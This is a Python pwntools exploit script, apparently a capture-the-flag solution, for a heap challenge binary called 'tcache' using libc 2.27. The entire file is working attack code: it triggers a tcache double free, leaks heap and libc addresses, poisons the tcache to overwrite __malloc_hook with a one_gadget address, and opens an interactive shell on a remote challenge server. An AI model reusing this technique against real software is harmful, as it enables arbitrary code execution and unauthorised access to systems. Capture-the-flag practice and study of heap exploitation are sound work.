#!/usr/bin/env python3
from pwn import *
import sys
import pwnlib.shellcraft
import pwnlib
import time

c = 0
pwn_file = "./tcache"
lib_file = './libc-2.27.so'

elf = ELF(pwn_file)
lib = ELF(lib_file)
context.os='linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

context.log_level = 100
context.log_level = 'debug'


debug = 0
if debug == 1:
    ld_str = "./ld-2.23.so.64 --library-path ./ {}".format(pwn_file)
    print(ld_str.split())
    c = process(pwn_file, env={'LD_PRELOAD': lib_file})

    elf_path = c.cwd + c.argv[0].decode().strip('.')
    lib_path = c.cwd + lib_file.strip('.')

    sleep(0.1)
    print(c.libs())
    gdbcmd = '''
    file {} 
    info proc mappings
    set $lib={}

    '''.format(pwn_file, hex(c.libs()[lib_path]))

    gdb.attach(c, gdbcmd)
else:
    c = remote('140.110.112.77', '4007')


def malloc(data):
    c.sendafter('>', '1' + '\0' * 0xe)
    c.send(data)

def free():
    c.sendafter('>', '3' + '\0' * 0xe)

def puts():
    c.sendafter('>', '2' + '\0' * 0xe)

def create_free_chunk():
    malloc('a')
    free()
    free()
    free()
    free()
    free()

def leak_heap_base():
    create_free_chunk()
    puts()
    c.recvline()
    line = c.recvline()
    heap_addr = u64(flat(line[:-1], filler='\0', length=8))
    print(hex(heap_addr))
    return heap_addr

stdout_adrr = 0x404020
#heap_addr = leak_heap_base()


def leak_libc_base():
    create_free_chunk()
    malloc(p64(stdout_adrr - 8))
    malloc(b'\xff')
    malloc(b'a' * 8)
    puts()
    c.recvline()
    line = c.recvline()
    libc_addr = u64(flat(line[8:-1], filler='\0', length=8)) - 0x3ec6ff-0x61
    print('libc:', hex(libc_addr))
    return libc_addr

libc_addr = leak_libc_base()
one_gadget = libc_addr + 0x4f322

malloc_hook = libc_addr + lib.symbols['__malloc_hook']
print(hex(malloc_hook))


malloc('a')
free()
free()

malloc(p64(malloc_hook))
malloc(b'\xff')
malloc(p64(one_gadget))
malloc('sh')
c.interactive()
c.close()

